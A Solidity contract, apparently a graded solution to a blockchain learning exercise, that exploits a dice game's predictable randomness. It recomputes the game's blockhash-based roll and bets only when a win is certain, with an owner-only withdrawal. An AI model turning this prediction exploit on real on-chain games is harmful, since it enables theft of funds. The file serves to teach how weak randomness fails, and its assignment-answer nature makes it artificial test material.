pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdrawTo(address payable _to, uint256 _amount) public onlyOwner {
        require(_amount <= address(this).balance, "Insufficient balance in contract");
        (bool success, ) = _to.call{value: _amount}("");
        require(success, "Transfer failed");
    }


    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
     function riggedRoll() public payable {
        require(msg.value >= 0.002 ether, "Insufficient Ether sent");
        require(address(this).balance >= 0.002 ether, "Insufficient contract balance");

        // Predict the next roll
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted roll:", roll);

        // Only roll if the prediction is favorable (<= 5)
        if (roll <= 5) {
            diceGame.rollTheDice{value: msg.value}();
        } else {
            revert("Unfavorable roll predicted");
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
